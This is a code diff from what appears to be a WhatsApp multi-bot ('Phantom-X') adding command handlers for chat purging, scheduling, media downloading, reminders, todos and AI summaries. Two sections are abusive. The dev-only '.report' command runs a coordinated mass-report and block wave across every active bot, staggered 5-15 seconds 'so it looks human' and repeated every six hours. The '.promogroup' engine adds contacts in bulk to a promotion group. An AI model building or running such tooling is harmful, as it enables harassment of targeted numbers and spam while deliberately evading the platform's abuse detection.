+                    text: buildOmegaTerminal(
+                        `   ✦ EXILE_LIFTED\n\n` +
+                        `   🔓  TARGET   →  @${unbanTarget.split("@")[0]}\n` +
+                        `   ♻️  ACTION   →  RESTORED\n` +
+                        `   🌐  STATUS   →  FREE\n\n` +
+                        `   " The exile is over.\n     The void grants passage\n     once more. Walk wisely. "`
+                    ),
+                    mentions: [unbanTarget]
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- ANTIDELETE ---
+            // --- CLEAR CHAT ---
+            case ".clear": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) {
+                    if (isGroup) {
+                        const rcRoles = await getGroupRoles(sock, from);
+                        if (!rcRoles.admins.has(senderJid)) return reply("❌ Only admins can clear messages.");
+                    } else {
+                        return reply("❌ Owner only in private chat.");
+                    }
+                }
+                const clearSub = parts[1]?.toLowerCase();
+                const cacheKey = `${sock.user?.id}::${from}`;
+                const cachedMsgs = (globalMsgCache[cacheKey] || []).slice();
+                if (!clearSub) {
+                    // Show prompt
+                    if (isGroup) {
+                        const rcCheck = await getGroupRoles(sock, from);
+                        const botIsAdmin = rcCheck.botIsAdmin;
+                        if (botIsAdmin) {
+                            return reply(buildOmegaTerminal(
+                                `   ░▒▓█ *PURGE_PROTOCOL* █▓▒░\n\n` +
+                                `   Choose what to purge:\n\n` +
+                                `   *.clear all* — delete ALL cached messages\n` +
+                                `               for everyone in this group\n\n` +
+                                `   *.clear me* — delete only YOUR messages\n` +
+                                `               from this group\n\n` +
+                                `   " *The past can be erased.*\n     *Choose wisely.* "`
+                            ));
+                        } else {
+                            return reply(buildOmegaTerminal(
+                                `   ░▒▓█ *PURGE_PROTOCOL* █▓▒░\n\n` +
+                                `   Bot is not admin — can only delete\n` +
+                                `   its own messages.\n\n` +
+                                `   *.clear me* — delete bot's own messages\n\n` +
+                                `   _(Make bot admin to enable full purge)_`
+                            ));
+                        }
+                    } else {
+                        return reply(buildOmegaTerminal(
+                            `   ░▒▓█ *PURGE_PROTOCOL* █▓▒░\n\n` +
+                            `   *.clear all* — delete all cached messages\n` +
+                            `   *.clear me* — delete only your own messages`
+                        ));
+                    }
+                }
+                if (!cachedMsgs.length) return reply("⚠️ No cached messages found. Only messages received while the bot was running can be cleared.");
+                await reply(`⏳ _Purging messages..._`);
+                let deleted = 0, failed = 0;
+                if (clearSub === "all") {
+                    // Delete all cached messages for this chat
+                    for (const m of cachedMsgs) {
+                        try {
+                            await sock.sendMessage(from, { delete: m.key });
+                            deleted++;
+                            await new Promise(r => setTimeout(r, 300));
+                        } catch { failed++; }
+                    }
+                    globalMsgCache[cacheKey] = [];
+                } else if (clearSub === "me") {
+                    // Delete only messages sent by the command sender (or bot's own messages in private)
+                    const targetSender = isGroup ? senderJid : (sock.user?.id || "");
+                    for (const m of cachedMsgs) {
+                        const msgSender = m.key?.participant || m.key?.remoteJid || "";
+                        const isFromTarget = m.key?.fromMe || jidLocal(msgSender) === jidLocal(targetSender);
+                        if (!isFromTarget) continue;
+                        try {
+                            await sock.sendMessage(from, { delete: m.key });
+                            deleted++;
+                            await new Promise(r => setTimeout(r, 300));
+                        } catch { failed++; }
+                    }
+                    globalMsgCache[cacheKey] = (globalMsgCache[cacheKey] || []).filter(m => {
+                        const msgSender = m.key?.participant || m.key?.remoteJid || "";
+                        return !m.key?.fromMe && jidLocal(msgSender) !== jidLocal(senderJid);
+                    });
+                } else {
+                    return reply("Usage: `.clear all` — everyone's messages\n`.clear me` — only your messages");
+                }
+                await reply(buildOmegaTerminal(
+                    `   ░▒▓█ *PURGE_COMPLETE* █▓▒░\n\n` +
+                    `   [ 🗑️ ] *DELETED* : ${deleted}\n` +
+                    `   [ ⚠️ ] *FAILED*  : ${failed}\n\n` +
+                    `   " *The slate is wiped clean.*\n     *What was spoken here*\n     *is now silence.* "`
+                ));
+                break;
+            }
+
+            case ".antidelete": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply(eclipseSay("only_owner"));
+                const adSub = parts[1]?.toLowerCase();
+                if (adSub === "on")  { setGroupSetting(from, "antidelete", true);  return reply(eclipseSay("antidelete_on")); }
+                if (adSub === "off") { setGroupSetting(from, "antidelete", false); return reply(eclipseSay("antidelete_off")); }
+                return replyBadOnOff(sock, from, msg, ".antidelete");
+            }
+
+            // --- ANTIBOT ---
+            case ".antibot": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                const abSub = parts[1]?.toLowerCase();
+                if (abSub === "on") {
+                    setGroupSetting(from, "antibot", true);
+                    if (!r.botIsAdmin) await reply(eclipseSay("not_admin_note"));
+                    return reply(eclipseSay("antibot_on"));
+                }
+                if (abSub === "off") { setGroupSetting(from, "antibot", false); return reply(eclipseSay("antibot_off")); }
+                return replyBadOnOff(sock, from, msg, ".antibot");
+            }
+
+            // --- SCHEDULE ---
+            case ".schedule": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const schedTime = parts[1];
+                const schedMsg = parts.slice(2).join(" ").trim();
+                if (!schedTime || !schedMsg || !/^\d{2}:\d{2}$/.test(schedTime)) return reply("Usage: .schedule HH:MM <message>\nExample: .schedule 08:00 Good morning everyone!");
+                const schedData = loadSchedules();
+                if (!schedData[from]) schedData[from] = [];
+                const exists = schedData[from].find(s => s.time === schedTime);
+                if (exists) { exists.message = schedMsg; exists.botJid = botJid; }
+                else { schedData[from].push({ time: schedTime, message: schedMsg, botJid }); }
+                saveSchedules(schedData);
+                await reply(`✅ Scheduled *${schedTime}* daily:\n_"${schedMsg}"_`);
+                break;
+            }
+
+            case ".unschedule": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const uTime = parts[1];
+                if (!uTime) return reply("Usage: .unschedule HH:MM");
+                const ud = loadSchedules();
+                if (ud[from]) { ud[from] = ud[from].filter(s => s.time !== uTime); saveSchedules(ud); }
+                await reply(`✅ Schedule at *${uTime}* removed.`);
+                break;
+            }
+
+            case ".schedules": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                const sd = loadSchedules();
+                const entries = sd[from] || [];
+                if (!entries.length) return reply("📅 No active schedules for this group.");
+                let sTxt = "📅 *Active Schedules*\n━━━━━━━━━━━━━━━━━━━\n\n";
+                entries.forEach(s => { sTxt += `⏰ *${s.time}* — _"${s.message}"_\n`; });
+                await reply(sTxt);
+                break;
+            }
+
+            case ".dl":
+            case ".yt": case ".ytdl": case ".ytmp4":
+            case ".tiktok": case ".tt":
+            case ".ig": case ".insta": case ".instagram":
+            case ".fb": case ".facebook":
+            case ".x": case ".twitter":
+            case ".sc": case ".soundcloud":
+            case ".pin": case ".pinterest":
+            case ".reddit":
+            case ".tumblr": case ".vimeo": case ".twitch":
+            case ".ytmp3": case ".ytaudio": {
+                const flags = parts.slice(1).filter(p => p.startsWith("--") || p === "audio");
+                const urlArgs = parts.slice(1).filter(p => !p.startsWith("--") && p !== "audio");
+                const url = urlArgs[0];
+                if (!url || !/^https?:\/\//i.test(url)) return reply(`Usage: ${cmd} <url> [audio]\nExample: ${cmd} https://youtu.be/dQw4w9WgXcQ`);
+                const audioCmds = [".ytmp3", ".ytaudio", ".sc", ".soundcloud"];
+                const audio = audioCmds.includes(cmd) || flags.includes("audio") || flags.includes("--audio");
+                await reply("⏳ _Cooking your media... give me a sec._");
+                try {
+                    // Min buffer sizes — anything smaller is a black/corrupt/empty file
+                    const MIN_VIDEO = 80 * 1024;   // 80 KB
+                    const MIN_AUDIO = 20 * 1024;   // 20 KB
+                    const MIN_IMAGE =  5 * 1024;   //  5 KB
+
+                    let result = await downloadMedia(url, { audio });
+                    let buf = await fetchBuffer(result.url);
+
+                    // If the returned file is suspiciously small, it's almost certainly a
+                    // black / corrupt / placeholder — automatically skip that provider and retry.
+                    const minBytes = result.type === "audio" ? MIN_AUDIO : result.type === "image" ? MIN_IMAGE : MIN_VIDEO;
+                    if (buf.length < minBytes) {
+                        console.log(`[dl] ${result.provider} returned ${buf.length}B (< ${minBytes}B) for ${url} — retrying next provider`);
+                        markDlHealth(result.provider, false, `suspiciously small: ${buf.length}B`);
+                        try {
+                            result = await downloadMedia(url, { audio, skipProviders: [result.provider] });
+                            buf = await fetchBuffer(result.url);
+                        } catch (_) {
+                            // retry failed — fall through with the original (will hit size check below)
+                        }
+                    }
+
+                    const sizeMB = buf.length / 1024 / 1024;
+                    if (sizeMB > 95) return reply(`❌ File too big (${sizeMB.toFixed(1)}MB). WhatsApp limit is ~100MB.\n\n_Try the audio version instead, or pick a shorter clip._`);
+                    if (buf.length < minBytes) return reply(`❌ *Download returned an empty or corrupt file.*\n\nAll providers failed for this link. Try again later or use a different URL.`);
+
+                    const caption = `✅ *${result.platform.toUpperCase()}* • via _${result.provider}_${result.title ? `\n\n📝 ${result.title}` : ""}\n\n_Powered by Phantom-X_`;
+                    if (result.type === "audio") {
+                        await sock.sendMessage(from, { audio: buf, mimetype: "audio/mp4" }, { quoted: msg });
+                    } else if (result.type === "image") {
+                        await sock.sendMessage(from, { image: buf, caption }, { quoted: msg });
+                    } else {
+                        await sock.sendMessage(from, { video: buf, caption }, { quoted: msg });
+                    }
+                } catch (e) {
+                    await reply(`❌ *Download failed.*\n\n${e?.message || e}`);
+                    if (e?.providerErrors) notifyOwnerDlFailure(sock, e.platform, url, e.providerErrors).catch(() => {});
+                }
+                break;
+            }
+
+            case ".dlhealth": {
+                const data = loadDlHealth();
+                const entries = Object.entries(data);
+                if (!entries.length) return reply("📊 No download stats yet. Try `.dl <url>` first.");
+                let txt = "📊 *Downloader Health*\n━━━━━━━━━━━━━━━━━━━\n\n";
+                for (const [name, s] of entries) {
+                    const total = s.ok + s.fail;
+                    const rate = total ? Math.round((s.ok / total) * 100) : 0;
+                    const emoji = rate >= 80 ? "🟢" : rate >= 40 ? "🟡" : "🔴";
+                    const last = s.lastUsed ? `${Math.round((Date.now() - s.lastUsed) / 60000)}m ago` : "never";
+                    txt += `${emoji} *${name}*\n   ✅ ${s.ok}  ❌ ${s.fail}  •  ${rate}% success\n   _last used: ${last}_\n`;
+                    if (s.lastFailMsg && s.fail > 0) txt += `   ⚠️ _last err: ${s.lastFailMsg.slice(0, 80)}_\n`;
+                    txt += "\n";
+                }
+                txt += `_Auto-fallback active. Owner is DM'd when all providers fail for a platform._`;
+                await reply(txt);
+                break;
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ THREAT NETWORK (DEV ONLY) ░░░░░
+            // ════════════════════════════════════════
+            case ".report": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const targetArg = parts[1];
+                if (!targetArg) return reply(`🚨 *Threat Network — Mass Report*\n\nUsage:\n*.report <num> [category] [note]*\n\nCategories: ${REPORT_CATEGORIES.join(", ")}\nDefault category: scam\n\nThis blocks the number on EVERY active bot and submits a WhatsApp report from each, with 5-15s stagger so it looks human.`);
+                const cleanNum = normalizeNum(targetArg);
+                if (!cleanNum || cleanNum.length < 7) return reply("❌ Invalid number.");
+                const cat = (parts[2] && REPORT_CATEGORIES.includes(parts[2].toLowerCase())) ? parts[2].toLowerCase() : "scam";
+                const noteParts = (parts[2] && REPORT_CATEGORIES.includes(parts[2].toLowerCase())) ? parts.slice(3) : parts.slice(2);
+                const note = noteParts.join(" ").trim();
+                addThreat(cleanNum, sock.user?.id, cat, note);
+                const totalBots = Object.values(activeSockets).filter(s => s?.user).length;
+                await reply(`🚨 *Threat Network engaged.*\n\n• Target: +${cleanNum}\n• Category: ${cat}\n• Bots in wave: ${totalBots}\n• Stagger: 5-15s\n\n_Running in background. You'll get a summary DM when done._`);
+                runReportWaveAcrossAllBots(cleanNum, cat, { staggerSec: 8 }).then(res => {
+                    sock.sendMessage(senderJid, { text: `✅ *Report wave complete*\n\n• Target: +${cleanNum}\n• Bots succeeded: ${res.ok}/${res.totalBots}\n• Failed: ${res.fail}\n\nNext re-report in 6h.` }).catch(() => {});
+                }).catch(e => { sock.sendMessage(senderJid, { text: `⚠️ Report wave error: ${e?.message}` }).catch(() => {}); });
+                break;
+            }
+
+            case ".threats":
+            case ".blacklist": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const d = loadThreats();
+                const ents = Object.entries(d);
+                if (!ents.length) return reply(buildOmegaTerminal(
+                    `   ╔══ *THREAT_NETWORK_DB* ══╗\n\n` +
+                    `      ☠️ *CORRUPTED_VESSELS*\n\n` +
+                    `      [ EMPTY — NO ENTRIES ]\n\n` +
+                    `   ╚═════════════════════════╝\n\n` +
+                    `   " *Memory is a weapon. I*\n     *never forget a face that*\n     *tried to glitch my core.* "`
+                ));
+                let entries = "";
+                ents.sort((a, b) => (b[1].lastSeen || 0) - (a[1].lastSeen || 0)).slice(0, 20).forEach(([num, t]) => {
+                    entries += `   ☠️ +${num} — ${t.primaryCategory || "scam"} [${t.reports?.length || 0} rpt]\n`;
+                });
+                if (ents.length > 20) entries += `   _...and ${ents.length - 20} more._\n`;
+                await reply(buildOmegaTerminal(
+                    `   ╔══ *THREAT_NETWORK_DB* ══╗\n\n` +
+                    `      ☠️ *CORRUPTED_VESSELS* (${ents.length})\n\n` +
+                    entries +
+                    `\n   ╚═════════════════════════╝\n\n` +
+                    `   _Use .scan <num> for details_\n` +
+                    `   _Use .clearance <num> to remove_\n\n` +
+                    `   " *Memory is a weapon. I*\n     *never forget a face that*\n     *tried to glitch my core.* "`
+                ));
+                break;
+            }
+
+            case ".threatinfo":
+            case ".scan": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const cleanNum = normalizeNum(parts[1]);
+                if (!cleanNum) return reply("Usage: *.scan <num>*  (or .threatinfo <num>)");
+                const t = getThreat(cleanNum);
+                if (!t) return reply(buildOmegaTerminal(
+                    `      ◢◤ *INTEL_PROBE_ACTIVE* ◢◤\n\n` +
+                    `      [ 👤 ] : +${cleanNum}\n` +
+                    `      [ ✅ ] : STATUS: NOT_FLAGGED\n\n` +
+                    `   " *This vessel is clear.*\n     *For now.* "`
+                ));
+                const rptCount = t.reports?.length || 0;
+                const barFill = Math.min(10, Math.round(rptCount / 2));
+                const bar = "▓".repeat(barFill) + "░".repeat(10 - barFill);
+                const pct = Math.min(100, rptCount * 10);
+                const recentReports = (t.reports || []).slice(-3).map(r => `      ↳ ${r.category} — ${r.note || "(no note)"}`).join("\n");
+                await reply(buildOmegaTerminal(
+                    `      ◢◤ *INTEL_PROBE_ACTIVE* ◢◤\n\n` +
+                    `      [ 👤 ] : +${cleanNum}\n` +
+                    `      [ ⚠️ ] : STRIKE_LEVEL: [ ${String(rptCount).padStart(2,"0")} ]\n` +
+                    `      [ 📂 ] : HISTORY_SCAN:\n` +
+                    `              ${bar} ${pct}%\n` +
+                    `      [ 🔖 ] : CATEGORY: ${t.primaryCategory || "UNKNOWN"}\n` +
+                    `      [ 🛡️ ] : STATUS: ${t.severity || "WATCHLIST"}\n` +
+                    (recentReports ? `\n      *RECENT REPORTS:*\n${recentReports}\n` : "") +
+                    `\n   " *The shadow is small, but*\n     *it is growing. I am*\n     *tracking every heartbeat.* "`
+                ));
+                break;
+            }
+
+            case ".unthreat":
+            case ".clearance": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const cleanNum = normalizeNum(parts[1]);
+                if (!cleanNum) return reply("Usage: *.clearance <num>*  (or .unthreat <num>)");
+                if (removeThreat(cleanNum)) {
+                    await reply(buildOmegaTerminal(
+                        `      ┌── *AMNESTY_PROTOCOL* ──┐\n` +
+                        `      ╿\n` +
+                        `      ┝  *VESSEL* : +${cleanNum}\n` +
+                        `      ┝  *ACTION* : PURGE_THREAT\n` +
+                        `      ┝  *STATUS* : RESTORED\n` +
+                        `      ╿\n` +
+                        `      └── *ACCESS_GRANTED* ───┘\n\n` +
+                        `   " *The Void is merciful...*\n     *today. Do not let me*\n     *regret this restoration.* "`
+                    ));
+                } else {
+                    await reply("⚠️ Number not found in threat network.");
+                }
+                break;
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ PROMOGROUP (DEV ONLY) ░░░░░
+            // ════════════════════════════════════════
+            case ".promogroup": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const sub = (parts[1] || "").toLowerCase();
+                const cfg = loadPromoGroup();
+                if (!sub || sub === "status") {
+                    const totalAdded = Object.values(cfg.added).reduce((a, o) => a + Object.keys(o).length, 0);
+                    return reply(`📈 *PromoGroup Engine*\n━━━━━━━━━━━━━━━━━━━\nStatus: ${cfg.enabled ? (cfg.paused ? "⏸️ paused" : "🟢 running") : "🔴 off"}\nGroup: ${cfg.groupJid || "(not set)"}\nLink: ${cfg.groupLink || "(not set)"}\nRate: *${cfg.rate}/cycle*\nInterval: every *${cfg.intervalHours}h* per bot\nPool: ${cfg.poolAuto ? "auto (contacts)" : "manual only"}\nManual pool: ${cfg.manualPool.length}\nOpted-out: ${cfg.optedOut.length}\n\n*Stats*\nAdded: ${cfg.stats.totalAdded}\nInvited (DM): ${cfg.stats.totalInvited}\nFailed: ${cfg.stats.totalFailed}\nUnique adds: ${totalAdded}\n\n*Subcommands:*\n.promogroup setgroup <jid> <link>\n.promogroup rate <n>\n.promogroup interval <hours>\n.promogroup on | off | pause | resume\n.promogroup pool auto | manual\n.promogroup add <num> | remove <num> | optout <num>\n.promogroup runnow\n.promogroup reset`);
+                }
+                if (sub === "setgroup") {
+                    if (!parts[2]) return reply("Usage: *.promogroup setgroup <group@g.us> <invite_link>*");
+                    cfg.groupJid = parts[2];
+                    if (parts[3]) cfg.groupLink = parts[3];
+                    savePromoGroup(cfg); return reply(`✅ Group set.\nJID: ${cfg.groupJid}\nLink: ${cfg.groupLink}`);
+                }
+                if (sub === "rate") { cfg.rate = Math.max(1, Math.min(10, parseInt(parts[2]) || 2)); savePromoGroup(cfg); return reply(`✅ Rate set to *${cfg.rate}/cycle*.`); }
+                if (sub === "interval") { cfg.intervalHours = Math.max(1, Math.min(168, parseInt(parts[2]) || 24)); savePromoGroup(cfg); return reply(`✅ Interval set to *${cfg.intervalHours}h*.`); }
+                if (sub === "on") { if (!cfg.groupJid) return reply("❌ Set the group first: *.promogroup setgroup <jid> <link>*"); cfg.enabled = true; cfg.paused = false; savePromoGroup(cfg); return reply("🟢 PromoGroup *ON*."); }
+                if (sub === "off") { cfg.enabled = false; savePromoGroup(cfg); return reply("🔴 PromoGroup *OFF*."); }
+                if (sub === "pause") { cfg.paused = true; savePromoGroup(cfg); return reply("⏸️ PromoGroup paused."); }
+                if (sub === "resume") { cfg.paused = false; savePromoGroup(cfg); return reply("▶️ PromoGroup resumed."); }
+                if (sub === "pool") { cfg.poolAuto = (parts[2] || "auto").toLowerCase() === "auto"; savePromoGroup(cfg); return reply(`✅ Pool set to *${cfg.poolAuto ? "auto" : "manual"}*.`); }
+                if (sub === "add") { const n = normalizeNum(parts[2]); if (!n) return reply("Usage: .promogroup add <num>"); if (!cfg.manualPool.includes(n)) cfg.manualPool.push(n); savePromoGroup(cfg); return reply(`✅ Added +${n} to manual pool.`); }
+                if (sub === "remove") { const n = normalizeNum(parts[2]); cfg.manualPool = cfg.manualPool.filter(x => x !== n); savePromoGroup(cfg); return reply(`✅ Removed +${n} from manual pool.`); }
+                if (sub === "optout") { const n = normalizeNum(parts[2]); if (!cfg.optedOut.includes(n)) cfg.optedOut.push(n); savePromoGroup(cfg); return reply(`✅ +${n} will never be contacted.`); }
+                if (sub === "runnow") {
+                    await reply("⏳ Running cycle for this bot (bypassing business-hours gate)…");
+                    const cfg2 = loadPromoGroup();
+                    const pool2 = getPromoGroupContactPool(sock, cfg2);
+                    const done2 = new Set(Object.keys((cfg2.added[sock.user?.id] || {})).concat(Object.keys((cfg2.skipped[sock.user?.id] || {})).filter(k => (cfg2.skipped[sock.user?.id][k]?.reason === "permanent"))));
+                    const eligible2 = pool2.filter(n => !done2.has(n));
+                    if (!eligible2.length) { await reply("ℹ️ No eligible contacts left in the pool."); return; }
+                    runPromoGroupCycleForBot(sock).then(() => sock.sendMessage(senderJid, { text: "✅ Cycle done. Check *.promogroup status*." })).catch(e => sock.sendMessage(senderJid, { text: `⚠️ ${e?.message}` }));
+                    return;
+                }
+                if (sub === "reset") { cfg.added = {}; cfg.skipped = {}; cfg.lastRun = {}; cfg.stats = { totalAdded: 0, totalInvited: 0, totalFailed: 0 }; savePromoGroup(cfg); return reply("🧹 Stats + history cleared."); }
+                return reply("Unknown subcommand. Send *.promogroup* alone for help.");
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ PRODUCTIVITY ░░░░░
+            // ════════════════════════════════════════
+            case ".remind": {
+                const sub = (parts[1] || "").toLowerCase();
+                const arr = loadReminders();
+                if (sub === "list") {
+                    const mine = arr.filter(r => r.userJid === senderJid).sort((a, b) => a.fireAt - b.fireAt);
+                    if (!mine.length) return reply("📭 No active reminders. Set one with *.remind <time> <text>*");
+                    let t = "⏰ *Your Reminders*\n━━━━━━━━━━━━━━━\n";
+                    mine.forEach(r => t += `• [${r.id}] in ${fmtDuration(r.fireAt - Date.now())} — ${r.text}\n`);
+                    return reply(t);
+                }
+                if (sub === "delete" || sub === "del") {
+                    const id = parts[2];
+                    if (!id) return reply("Usage: *.remind del <id>*");
+                    const next = arr.filter(r => !(r.id === id && r.userJid === senderJid));
+                    if (next.length === arr.length) return reply("⚠️ Not found.");
+                    saveReminders(next); return reply(`🗑️ Deleted reminder *${id}*.`);
+                }
+                const dur = parseDuration(parts[1]);
+                if (!dur) return reply(`⏰ *Reminders*\n\nUsage:\n*.remind <duration> <text>*\n  e.g. .remind 30m drink water\n  e.g. .remind 2h30m call mum\n  e.g. .remind 1d submit report\n\n*.remind list*  — view\n*.remind del <id>*  — cancel`);
+                const text = parts.slice(2).join(" ").trim();
+                if (!text) return reply("❌ Add the reminder text after the time.");
+                const entry = { id: shortId(), chatJid: from, userJid: senderJid, text, fireAt: Date.now() + dur, botJid: sock.user?.id, createdAt: Date.now() };
+                arr.push(entry); saveReminders(arr);
+                armReminder(entry, () => sock);
+                return reply(`✅ Reminder set!\n• ID: *${entry.id}*\n• Fires in: *${fmtDuration(dur)}*\n• Text: ${text}`);
+            }
+
+            case ".todo": {
+                const sub = (parts[1] || "").toLowerCase();
+                const all = loadTodos();
+                if (!all[senderJid]) all[senderJid] = [];
+                const list = all[senderJid];
+                if (!sub || sub === "list") {
+                    if (!list.length) return reply("📝 Your todo list is empty. Add: *.todo add <task>*");
+                    let t = `📝 *Your Todos* (${list.filter(x => !x.done).length} open)\n━━━━━━━━━━━━━━━\n`;
+                    list.forEach((x, i) => t += `${x.done ? "✅" : "⬜"} ${i + 1}. ${x.text}\n`);
+                    t += `\n*.todo add <task>* | *.todo done <n>* | *.todo del <n>* | *.todo clear*`;
+                    return reply(t);
+                }
+                if (sub === "add") {
+                    const text = parts.slice(2).join(" ").trim();
+                    if (!text) return reply("Usage: *.todo add <task>*");
+                    list.push({ text, done: false, at: Date.now() }); saveTodos(all);
+                    return reply(`✅ Added: ${text}`);
+                }
+                if (sub === "done") {
+                    const i = parseInt(parts[2]) - 1;
+                    if (isNaN(i) || !list[i]) return reply("⚠️ Invalid number.");
+                    list[i].done = true; saveTodos(all); return reply(`✅ Marked done: ${list[i].text}`);
+                }
+                if (sub === "del") {
+                    const i = parseInt(parts[2]) - 1;
+                    if (isNaN(i) || !list[i]) return reply("⚠️ Invalid number.");
+                    const removed = list.splice(i, 1); saveTodos(all); return reply(`🗑️ Deleted: ${removed[0].text}`);
+                }
+                if (sub === "clear") { all[senderJid] = []; saveTodos(all); return reply("🧹 Todo list cleared."); }
+                return reply("Unknown subcommand. Try *.todo*.");
+            }
+
+            case ".note": {
+                const sub = (parts[1] || "").toLowerCase();
+                const all = loadNotes();
+                if (!all[senderJid]) all[senderJid] = {};
+                const myNotes = all[senderJid];
+                if (!sub || sub === "list") {
+                    const keys = Object.keys(myNotes);
+                    if (!keys.length) return reply("📒 No notes yet.\n\n*.note save <name> <text>*\n*.note get <name>*\n*.note del <name>*");
+                    return reply(`📒 *Your Notes*\n━━━━━━━━━━━━━\n${keys.map(k => `• ${k}`).join("\n")}\n\n*.note get <name>* to view`);
+                }
+                if (sub === "save") {
+                    const name = parts[2]; const text = parts.slice(3).join(" ").trim();
+                    if (!name || !text) return reply("Usage: *.note save <name> <text>*");
+                    myNotes[name] = { text, at: Date.now() }; saveNotes(all); return reply(`💾 Note *${name}* saved.`);
+                }
+                if (sub === "get") {
+                    const name = parts[2]; if (!name || !myNotes[name]) return reply("⚠️ Note not found.");
+                    return reply(`📒 *${name}*\n━━━━━━━━━━━━━\n${myNotes[name].text}`);
+                }
+                if (sub === "del") {
+                    const name = parts[2]; if (!myNotes[name]) return reply("⚠️ Not found.");
+                    delete myNotes[name]; saveNotes(all); return reply(`🗑️ Deleted note *${name}*.`);
+                }
+                return reply("Unknown subcommand.");
+            }
+
+            case ".timer": {
+                const sub = (parts[1] || "").toLowerCase();
+                if (sub === "list") {
+                    const mine = loadTimers().filter(t => t.userJid === senderJid);
+                    if (!mine.length) return reply("⏱️ No active timers.");
+                    let t = "⏱️ *Your Timers*\n━━━━━━━━━━━\n";
+                    mine.forEach(x => t += `• [${x.id}] ${fmtDuration(x.fireAt - Date.now())} left ${x.label ? `— ${x.label}` : ""}\n`);
+                    return reply(t);
+                }
+                if (sub === "stop") {
+                    const id = parts[2]; const arr = loadTimers();
+                    const next = arr.filter(t => !(t.id === id && t.userJid === senderJid));
+                    if (next.length === arr.length) return reply("⚠️ Not found.");
+                    saveTimers(next); return reply(`🛑 Timer *${id}* stopped.`);
+                }
+                const dur = parseDuration(parts[1]);
+                if (!dur) return reply(`⏱️ *Timer*\n\n*.timer 5m [label]*\n*.timer list*\n*.timer stop <id>*`);
+                const label = parts.slice(2).join(" ").trim();
+                const entry = { id: shortId(), chatJid: from, userJid: senderJid, fireAt: Date.now() + dur, label, botJid: sock.user?.id };
+                const arr = loadTimers(); arr.push(entry); saveTimers(arr);
+                armTimer(entry, () => sock);
+                return reply(`⏱️ Timer started: *${fmtDuration(dur)}*${label ? `\nLabel: ${label}` : ""}\nID: *${entry.id}*`);
+            }
+
+            case ".countdown": {
+                const sub = (parts[1] || "").toLowerCase();
+                const all = loadCountdowns();
+                if (!all[senderJid]) all[senderJid] = {};
+                if (!sub || sub === "list") {
+                    const ents = Object.entries(all[senderJid]);
+                    if (!ents.length) return reply("📅 No countdowns.\n\n*.countdown set <name> <YYYY-MM-DD>*\n*.countdown del <name>*");
+                    let t = "📅 *Your Countdowns*\n━━━━━━━━━━━━\n";
+                    ents.forEach(([name, c]) => {
+                        const days = Math.ceil((c.target - Date.now()) / 86400000);
+                        t += `• *${name}* — ${days >= 0 ? `${days} days to go` : `${Math.abs(days)} days ago`} (${c.dateStr})\n`;
+                    });
+                    return reply(t);
+                }
+                if (sub === "set") {
+                    const name = parts[2]; const dateStr = parts[3];
+                    if (!name || !dateStr) return reply("Usage: *.countdown set <name> <YYYY-MM-DD>*");
+                    const dt = new Date(dateStr + "T12:00:00+01:00");
+                    if (isNaN(dt.getTime())) return reply("❌ Invalid date.");
+                    all[senderJid][name] = { target: dt.getTime(), dateStr, at: Date.now() };
+                    saveCountdowns(all); return reply(`✅ Countdown *${name}* → ${dateStr}`);
+                }
+                if (sub === "del") {
+                    const name = parts[2]; if (!all[senderJid][name]) return reply("⚠️ Not found.");
+                    delete all[senderJid][name]; saveCountdowns(all); return reply(`🗑️ Deleted *${name}*.`);
+                }
+                return reply("Unknown subcommand.");
+            }
+
+            case ".calendar": {
+                const now = new Date();
+                const yr = parseInt(parts[1]) || now.getFullYear();
+                const mo = parts[2] ? parseInt(parts[2]) - 1 : now.getMonth();
+                if (mo < 0 || mo > 11) return reply("❌ Month must be 1-12.");
+                const all = loadCountdowns();
+                const marks = {};
+                for (const c of Object.values(all[senderJid] || {})) {
+                    const dt = new Date(c.target);
+                    if (dt.getFullYear() === yr && dt.getMonth() === mo) marks[dt.getDate()] = c.dateStr;
+                }
+                return reply("```\n" + buildCalendar(yr, mo, marks) + "\n```\n_Tip: *.countdown set <name> <date>* adds events._");
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ AI EXTRA ░░░░░
+            // ════════════════════════════════════════
+            case ".summarize": {
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                let txt = parts.slice(1).join(" ").trim();
+                if (!txt && quoted) txt = quoted.conversation || quoted.extendedTextMessage?.text || quoted.imageMessage?.caption || "";
+                if (!txt) return reply("📝 *Summarize*\n\nReply to a long message with *.summarize* or paste text after the command.");
+                await reply("⏳ Summarizing…");
+                try {
+                    const r = await callGemini(`Summarize the following text in 3-5 concise bullet points. Be clear and skip filler.\n\nTEXT:\n${txt.slice(0, 8000)}`, { temperature: 0.3 });
+                    return reply(`📝 *Summary*\n━━━━━━━━━━━━\n${r}`);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            case ".atranslate": {
+                const m = parts[1]; const to = (parts[2] || "en").toLowerCase();
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                let txt = parts.slice(m ? 1 : 0).join(" ").trim();
+                if (!txt && quoted) txt = quoted.conversation || quoted.extendedTextMessage?.text || "";
